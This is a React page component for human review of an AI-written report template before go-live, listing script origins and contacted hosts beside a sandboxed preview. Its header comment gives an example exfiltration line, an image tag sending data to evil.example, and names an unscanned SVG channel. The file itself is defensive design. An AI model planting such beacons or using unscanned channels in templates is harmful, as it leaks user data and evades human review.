/**
 * `/hypotheses/:id/golive` — the screen where a human approves a candidate
 * report template before go-live. UI design § 2, § 2b, § 5 and § 6b
 * (agent-bob repo, `design/2026-08-24-agent-wolf-ui.md`).
 *
 * ```
 * ┌─────────────────────────────────────────────────────────────┐
 * │  ← Petrodollar / drone parts            GO LIVE REVIEW      │
 * │                                                             │
 * │  ░ CANDIDATE · sess-hyp-1a2b3c4d · 4 hours ago          ░   │
 * │  ░ "a chart of the drone-parts basket against Brent"    ░   │
 * │  ░                                                      ░   │
 * │  ░ REMOTE CODE THIS TEMPLATE REFERENCES                 ░   │
 * │  ░   https://cdn-a.example/chart.js                     ░   │
 * │  ░ ORIGINS ALLOWED TO EXECUTE CODE                      ░   │
 * │  ░   https://cdn-a.example                              ░   │
 * │  ░ EVERYTHING ELSE IT WILL CONTACT                      ░   │
 * │  ░   https://img-b.example                              ░   │
 * │  ░   △ what the validator saw, not a guarantee          ░   │
 * │  ░ ┌───────────────────────────────────────────────┐    ░   │
 * │  ░ │ the REAL frame: real CSP, real sandbox        │    ░   │
 * │  ░ └───────────────────────────────────────────────┘    ░   │
 * │  ░ [ Accept this template ]                             ░   │
 * │                                                             │
 * │  [ Go live ]   (disabled until spec AND template)           │
 * └─────────────────────────────────────────────────────────────┘
 * ```
 *
 * ## Why there are THREE lists and not one
 *
 * 🔴 **`script_srcs` is not the set that reaches `script-src`, so labelling it
 * "permitted script origins" would be lying to the human approving it**
 * (W21's hand-off, R155). It is the raw URL list in document order and it is
 * **not https-only**: a CSS `@import url(data:…)` validates clean and puts a
 * `data:` URL in it, whose `origin` is the four characters `null` — a HOST
 * NAME in a CSP, not the keyword `'none'`. So the screen shows:
 *
 *  1. **Remote code this template references** — `script_srcs`, verbatim and
 *     in document order. This is what a human approves *as code*.
 *  2. **Origins allowed to execute code** — `code_origins`, derived
 *     SERVER-SIDE by `frame.ts`'s own `codeOrigins()`. The browser does not
 *     derive it: a third mapping of URL→origin would be a second opinion
 *     about the policy the human is approving, and the first time the two
 *     disagreed the human would approve one thing and Wolf would enforce
 *     another.
 *  3. **Everything else it will contact** — `remote_origins` MINUS the code
 *     origins. 🔴 **Routinely EMPTY** — for a template whose only remote URL
 *     is a `<script src>` the two sets are equal (§ 6b's "subset", corrected
 *     from "strict subset") — and an empty difference is rendered as a plain
 *     sentence, **never as an error**.
 *
 * Together they name every host in `remote_origins`, which is the criterion
 * revision 5 added: a template exfiltrating through
 * `<img src="https://evil.example/?d=…">` carries no code, appears nowhere in
 * `script_srcs`, and was approved by a human who never saw the host. Per
 * **R173** the inventory is what W16's validator SAW — SVG `fill`/`filter` is
 * an unscanned channel — and the caveat says so rather than claiming a
 * guarantee the code cannot keep.
 *
 * ## The preview is the real thing
 *
 * 🔴 The frame is `ReportFrameHost`'s child (W14 owns its height contract, its
 * expand dialog and the `postMessage` prohibition), it carries
 * `REPORT_SANDBOX` — the one token list, imported from `ReportPanel` rather
 * than retyped — and it points at a **URL**, never `srcdoc`. The CSP is a
 * HEADER and a header only applies to a document the browser fetched; a
 * `<meta http-equiv>` copy silently ignores `sandbox` and `frame-ancestors`,
 * the two directives that make the document safe. Reviewing a preview that
 * differs from production defeats the entire purpose of the screen.
 *
 * ⚠️ It cannot reuse `ReportPanel` itself, and the reason is structural rather
 * than stylistic: `ReportPanel` renders `GET …/report/frame`, which serves the
 * **locked** template and 404s for every hypothesis that has not accepted one
 * — which is every hypothesis this screen exists for. The candidate has its
 * own frame route for exactly that reason, and everything about the frame
 * except the URL comes from the shared components and constants.
 *
 * ## The gate
 *
 * 🔴 Enabled iff `spec_validation.valid && report.has_template`, and
 * **neither condition alone enables it** (§ 6b). Both halves live in the ONE
 * `GoLiveButton`; this page supplies the second as a PROP and does not decide
 * anything itself. W22 owns the server-side `422` backstop, with a `path` of
 * `report.has_template`.
 */

import { useCallback, useEffect, useState } from "react";
import Box from "@mui/material/Box";
import Button from "@mui/material/Button";
import Skeleton from "@mui/material/Skeleton";
import Typography from "@mui/material/Typography";
import Link from "@mui/material/Link";
import { Link as RouterLink, useNavigate, useParams } from "react-router";
import GoLiveButton from "../components/GoLiveButton.js";
import Provenance from "../components/trust/Provenance.js";
import Severity from "../components/trust/Severity.js";
import TamperWarning from "../components/TamperWarning.js";
import ReportFrameHost from "../components/ReportFrameHost.js";
import { REPORT_SANDBOX } from "../components/ReportPanel.js";
import {
  ApiError,
  acceptReportTemplate,
  fetchHypothesis,
  fetchReportCandidate,
  reportCandidateFrameSrc,
} from "../api/client.js";
import { formatUtcDateTime } from "../format.js";
import type {
  HypothesisDetail as Detail,
  ReportCandidate,
  Tamper,
  TemplateIssue,
} from "../api/types.js";

// ── The sentences, written once ─────────────────────────────────────────

export const SCRIPT_SRCS_HEADING = "Remote code this template references";
export const CODE_ORIGINS_HEADING = "Origins allowed to execute code";
export const OTHER_ORIGINS_HEADING = "Everything else it will contact";

export const NO_SCRIPT_SRCS = "None — this template references no remote scripts or stylesheets.";
export const NO_CODE_ORIGINS = "None — the frame's script-src will carry no host at all.";
/** 🔴 The EMPTY DIFFERENCE. A plain sentence: the common case is not an error. */
export const NO_OTHER_ORIGINS =
  "Nothing else — every host this template contacts is already listed above as remote code.";

/** R173: the walker does not scan SVG `fill`/`filter`. An inventory, not a guarantee. */
export const ORIGIN_CAVEAT =
  "This is what the template validator saw. It does not scan hosts reached through SVG fill or " +
  "filter, so it is an inventory, not a guarantee.";

/** The empty state. An instruction, not a failure — the interview writes the candidate. */
export const NO_CANDIDATE =
  "The interview has not produced a report candidate yet. Keep talking to the agent in the " +
  "conversation rail; it writes one as an interview output.";

/**
 * Shown in place of the accept button once THIS candidate is the locked
 * template. Without it the button stayed clickable after a successful accept
 * and nothing on the screen said the click had done anything (2026-09-13, the
 * first real-model walk).
 */
export const TEMPLATE_ACCEPTED = "Template accepted. Go live when you are ready.";

/** A hypothesis that has already left draft has nothing left to launch here. */
export const NOT_A_DRAFT = "This hypothesis is no longer a draft, so there is nothing to take live here.";

export const CANDIDATE_INVALID =
  "This candidate does not pass the template validator, so it cannot be accepted. The interview " +
  "has to propose a corrected one:";

// ── The set difference ──────────────────────────────────────────────────

/**
 * "Everything else" — `remote_origins` MINUS `code_origins`.
 *
 * 🔴 The subtraction runs in this direction and only this direction. A code
 * origin absent from `remote_origins` cannot reach the wire — `composeFrame`
 * asserts the subset and throws an `internal` when it does not hold — but a
 * difference computed the other way round would invent a host on the one
 * screen where a human's decision depends on the list being exactly right.
 *
 * Both fields are read defensively: an older server, or a fixture, can omit
 * either, and an absent array must cost this section rather than unmounting
 * the page (R140).
 */
export function otherOrigins(candidate: {
  remote_origins?: string[] | null;
  code_origins?: string[] | null;
}): string[] {
  const code = new Set(Array.isArray(candidate.code_origins) ? candidate.code_origins : []);
  const remote = Array.isArray(candidate.remote_origins) ? candidate.remote_origins : [];
  return remote.filter((origin) => !code.has(origin));
}

// ── Small presentational pieces ─────────────────────────────────────────

/** A label, not a card. § 2b principle 4: density over air. */
function ListSection({
  heading,
  sectionTestId,
  headingTestId,
  itemTestId,
  emptyTestId,
  emptyText,
  values,
}: {
  heading: string;
  /**
   * 🔴 The section wrapper exists so a test can scope a list to the WORDS
   * above it. Every value on this screen was pinned before the headings were,
   * and a heading constant carrying the wrong sentence puts the
   * non-executable host list under the executable label — the exact
   * distinction the three lists exist to draw.
   */
  sectionTestId: string;
  headingTestId: string;
  itemTestId: string;
  emptyTestId: string;
  emptyText: string;
  values: string[];
}) {
  return (
    <Box component="section" data-testid={sectionTestId} sx={{ mb: 1.5 }}>
      <Typography
        data-testid={headingTestId}
        sx={{ fontSize: 12, fontWeight: 700, letterSpacing: "0.08em", mb: 0.5 }}
      >
        {heading}
      </Typography>
      {values.length === 0 ? (
        <Typography data-testid={emptyTestId} sx={{ fontSize: 13, color: "text.secondary" }}>
          {emptyText}
        </Typography>
      ) : (
        <Box component="ul" sx={{ m: 0, pl: 2.5 }}>
          {values.map((value) => (
            <Typography
              component="li"
              key={value}
              data-testid={itemTestId}
              variant="mono"
              sx={{ fontSize: 12, wordBreak: "break-all" }}
            >
              {value}
            </Typography>
          ))}
        </Box>
      )}
    </Box>
  );
}

/** `path: message`, one line each. A flattened list makes the human fix it n times. */
function IssueList({ issues, testId }: { issues: TemplateIssue[]; testId: string }) {
  return (
    <Box sx={{ display: "flex", flexDirection: "column", gap: 0.25 }}>
      {issues.map((issue) => (
        <Typography
          key={`${issue.path}:${issue.message}`}
          data-testid={testId}
          variant="mono"
          sx={{ display: "block", fontSize: 12 }}
        >
          {`${issue.path}: ${issue.message}`}
        </Typography>
      ))}
    </Box>
  );
}

/** The `{path, message}` list out of a 422's details bag, defensively. */
function issuesOf(err: unknown): TemplateIssue[] {
  if (!(err instanceof ApiError) || err.status !== 422) return [];
  const details = err.details;
  if (typeof details !== "object" || details === null) return [];
  const errors = (details as { errors?: unknown }).errors;
  if (!Array.isArray(errors)) return [];
  return errors.filter(
    (issue): issue is TemplateIssue =>
      typeof issue === "object" &&
      issue !== null &&
      typeof (issue as TemplateIssue).path === "string" &&
      typeof (issue as TemplateIssue).message === "string",
  );
}

/**
 * The tamper a `404 not_found` carried in its details.
 *
 * 🔴 "There is no candidate" and "the only candidate was written by something
 * that is not this hypothesis" are different facts. Swallowing this list
 * renders an attack as a benign empty state — the failure R185 records for the
 * detail route's `drift: null`, reached from the other side.
 */
function tamperOf(err: unknown): Tamper[] {
  if (!(err instanceof ApiError)) return [];
  const details = err.details;
  if (typeof details !== "object" || details === null) return [];
  const tamper = (details as { tamper?: unknown }).tamper;
  return Array.isArray(tamper) ? (tamper as Tamper[]) : [];
}

// ── The page ────────────────────────────────────────────────────────────

export default function GoLiveReview() {
  const params = useParams();
  const id = params["id"] ?? "";
  const navigate = useNavigate();

  const [detail, setDetail] = useState<Detail | null>(null);
  const [detailFailure, setDetailFailure] = useState<string | null>(null);

  const [candidate, setCandidate] = useState<ReportCandidate | null>(null);
  const [candidateTamper, setCandidateTamper] = useState<Tamper[]>([]);
  /** True once the candidate read has answered, whichever way. */
  const [candidateRead, setCandidateRead] = useState(false);
  /** Set only for a `not_found`: the empty state, which is not a failure. */
  const [candidateAbsent, setCandidateAbsent] = useState(false);
  const [candidateFailure, setCandidateFailure] = useState<string | null>(null);

  const [accepting, setAccepting] = useState(false);
  const [acceptIssues, setAcceptIssues] = useState<TemplateIssue[]>([]);
  const [acceptFailure, setAcceptFailure] = useState<string | null>(null);

  // Two INDEPENDENT reads. The detail payload carries the gate; the candidate
  // carries what is being approved. A failure of one must not blank the
  // other: a human who cannot reach the gate can still read the template, and
  // a human with no candidate still needs to see why go-live is refused.
  const loadDetail = useCallback(async (): Promise<void> => {
    try {
      setDetail(await fetchHypothesis(id));
      setDetailFailure(null);
    } catch (err) {
      setDetailFailure(
        err instanceof ApiError ? err.message : "could not read this hypothesis",
      );
    }
  }, [id]);

  const loadCandidate = useCallback(async (): Promise<void> => {
    try {
      const read = await fetchReportCandidate(id);
      setCandidate(read);
      setCandidateTamper(Array.isArray(read.tamper) ? read.tamper : []);
      setCandidateAbsent(false);
      setCandidateFailure(null);
    } catch (err) {
      setCandidate(null);
      // A 404 is the EMPTY STATE, not an error — and its `tamper` survives.
      const absent = err instanceof ApiError && err.kind === "not_found";
      setCandidateAbsent(absent);
      setCandidateTamper(tamperOf(err));
      setCandidateFailure(
        absent ? null : err instanceof ApiError ? err.message : "could not read the candidate",
      );
    } finally {
      setCandidateRead(true);
    }
  }, [id]);

  useEffect(() => {
    void loadDetail();
  }, [loadDetail]);

  useEffect(() => {
    void loadCandidate();
  }, [loadCandidate]);

  async function accept(): Promise<void> {
    if (candidate === null) return;
    setAccepting(true);
    setAcceptIssues([]);
    setAcceptFailure(null);
    try {
      // The candidate's bytes, verbatim. `structure_hash` is sha256 of exactly
      // these, so any normalisation would lock a template whose hash is not
      // the one the human approved.
      await acceptReportTemplate(id, candidate.html);
      // Re-read the gate's source rather than assuming it flipped: the server
      // decides `has_template`, here as everywhere else.
      await loadDetail();
    } catch (err) {
      const issues = issuesOf(err);
      if (issues.length > 0) {
        // 422 is `invalid` in the shared taxonomy and it carries per-path
        // detail. Flattening it into one sentence makes the human fix the
        // template one problem at a time.
        setAcceptIssues(issues);
      } else {
        setAcceptFailure(
          err instanceof ApiError ? err.message : "could not accept this template",
        );
      }
    } finally {
      setAccepting(false);
    }
  }


  // The server's word, twice over: a locked template exists AND it is this
  // candidate's bytes. A newer candidate deposited after an accept is not
  // accepted, and still offers the button.
  const candidateAccepted =
    candidate !== null &&
    detail?.report?.has_template === true &&
    candidate.structure_hash !== null &&
    detail.report.structure_hash === candidate.structure_hash;

  return (
    <Box data-testid="golive-review" sx={{ maxWidth: 900 }}>
      <Box sx={{ display: "flex", alignItems: "baseline", gap: 1.5, mb: 1.5 }}>
        <Link
          component={RouterLink}
          data-testid="back-to-hypothesis"
          to={`/hypotheses/${id}`}
          underline="hover"
          sx={{ fontSize: 13 }}
        >
          ← {detail?.hypothesis.title ?? id}
        </Link>
        <Box sx={{ flex: 1 }} />
        <Typography sx={{ fontSize: 12, fontWeight: 700, letterSpacing: "0.08em" }}>
          GO LIVE REVIEW
        </Typography>
      </Box>

      {detailFailure !== null ? (
        <Box data-testid="golive-error" sx={{ mb: 1.5 }}>
          <Severity level="degraded" cause={detailFailure} />
        </Box>
      ) : null}

      {/* 🔴 Every anomaly witnessed by the candidate read, whether or not a
          candidate came back with it. An attack that hides the thing it
          attacked is the failure the retraction defence exists to prevent. */}
      {candidateTamper.map((tamper) => (
        <Box key={`${tamper.reason}:${tamper.memory_id}`} sx={{ mb: 1 }}>
          <TamperWarning tamper={tamper} />
        </Box>
      ))}

      {candidateFailure !== null ? (
        <Box data-testid="candidate-failure" sx={{ mb: 1.5 }}>
          <Severity level="degraded" cause={candidateFailure} />
        </Box>
      ) : null}

      {!candidateRead ? <Skeleton data-testid="golive-loading" variant="rectangular" height={240} /> : null}

      {candidateAbsent ? (
        <Typography data-testid="candidate-empty" sx={{ fontSize: 13, color: "text.secondary", mb: 2 }}>
          {NO_CANDIDATE}
        </Typography>
      ) : null}

      {candidate !== null ? (
        // § 2, Channel P: a candidate is model-authored. A NON-SEMANTIC ground
        // tint and a stamp, never a warning treatment — a proposed template is
        // the system working, not a problem.
        <Provenance
          kind="model"
          worker={candidate.created_by_worker}
          session={candidate.created_by_session}
          atMs={candidate.created_at_ms}
        >
          <Typography data-testid="candidate-summary" sx={{ fontSize: 13, mb: 0.5 }}>
            {candidate.summary}
          </Typography>
          <Typography
            data-testid="candidate-written-at"
            variant="mono"
            sx={{ display: "block", fontSize: 11, color: "text.secondary", mb: 1.5 }}
          >
            {`${candidate.memory_id} · ${formatUtcDateTime(candidate.created_at_ms)}`}
          </Typography>

          {/* 🔴 The lists sit ABOVE the preview, so they cannot scroll away
              from the thing they describe. */}
          <ListSection
            heading={SCRIPT_SRCS_HEADING}
            sectionTestId="section-script-srcs"
            headingTestId="script-srcs-heading"
            itemTestId="script-src"
            emptyTestId="script-srcs-empty"
            emptyText={NO_SCRIPT_SRCS}
            values={candidate.script_srcs ?? []}
          />
          <ListSection
            heading={CODE_ORIGINS_HEADING}
            sectionTestId="section-code-origins"
            headingTestId="code-origins-heading"
            itemTestId="code-origin"
            emptyTestId="code-origins-empty"
            emptyText={NO_CODE_ORIGINS}
            values={candidate.code_origins ?? []}
          />
          <ListSection
            heading={OTHER_ORIGINS_HEADING}
            sectionTestId="section-other-origins"
            headingTestId="other-origins-heading"
            itemTestId="other-origin"
            emptyTestId="other-origins-empty"
            emptyText={NO_OTHER_ORIGINS}
            values={otherOrigins(candidate)}
          />
          <Typography
            data-testid="origin-caveat"
            sx={{ fontSize: 12, color: "text.secondary", mb: 1.5 }}
          >
            {ORIGIN_CAVEAT}
          </Typography>

          {candidate.valid ? (
            <ReportFrameHost heading="Candidate report preview">
              {/* 🔴 A URL, never `srcdoc`, and ONE sandbox token — the same
                  constant `ReportPanel` renders, so `allow-same-origin`
                  cannot arrive here through a second spelling. */}
              <iframe
                data-testid="candidate-preview"
                title="Candidate report preview"
                src={reportCandidateFrameSrc(id)}
                sandbox={REPORT_SANDBOX}
                style={{ width: "100%", height: "100%", border: "0", display: "block" }}
              />
            </ReportFrameHost>
          ) : (
            <Box data-testid="candidate-invalid" sx={{ display: "flex", flexDirection: "column", gap: 0.5 }}>
              <Typography sx={{ fontSize: 13, color: "text.secondary" }}>
                {CANDIDATE_INVALID}
              </Typography>
              <IssueList issues={candidate.errors ?? []} testId="candidate-error" />
            </Box>
          )}

          {candidate.valid ? (
            <Box sx={{ mt: 1.5, display: "flex", flexDirection: "column", gap: 1 }}>
              {candidateAccepted ? (
                <Typography data-testid="accept-done" sx={{ fontSize: 13 }}>
                  {TEMPLATE_ACCEPTED}
                </Typography>
              ) : (
                <Box>
                  <Button
                    data-testid="accept-template"
                    variant="contained"
                    size="small"
                    disabled={accepting}
                    onClick={() => void accept()}
                  >
                    Accept this template
                  </Button>
                </Box>
              )}
              {acceptIssues.length > 0 ? (
                <Box data-testid="accept-errors" sx={{ display: "flex", flexDirection: "column", gap: 0.5 }}>
                  <Typography sx={{ fontSize: 13, color: "text.secondary" }}>
                    The server refused this template:
                  </Typography>
                  <IssueList issues={acceptIssues} testId="accept-error" />
                </Box>
              ) : null}
              {acceptFailure !== null ? <Severity level="degraded" cause={acceptFailure} /> : null}
            </Box>
          ) : null}
        </Provenance>
      ) : null}

      {/* The ONE gate, both halves. This page decides nothing itself.
          🔴 It is not rendered at all until the payload it gates on has been
          read: `GoLiveButton` treats an unstated field as "no refusal", which
          is the right rule for the detail page (W22's 422 is the backstop) and
          the wrong thing to show HERE — an enabled launch button over a gate
          nobody has read yet is a click the human cannot take back. */}
      {detail !== null && detail.hypothesis.status === "draft" ? (
        <Box sx={{ mt: 2 }}>
          {/* A successful go-live goes back to the detail page: that is where
              the live hypothesis is, and staying here left a clickable Go
              live and Accept over a launch that had already happened. */}
          <GoLiveButton
            hypothesisId={id}
            specValidation={detail.spec_validation}
            templateAccepted={detail.report?.has_template === true}
            onDone={() => void navigate(`/hypotheses/${id}`)}
          />
        </Box>
      ) : null}
      {detail !== null && detail.hypothesis.status != null && detail.hypothesis.status !== "draft" ? (
        <Typography data-testid="golive-not-draft" sx={{ fontSize: 13, color: "text.secondary", mt: 2 }}>
          {NOT_A_DRAFT}
        </Typography>
      ) : null}
    </Box>
  );
}
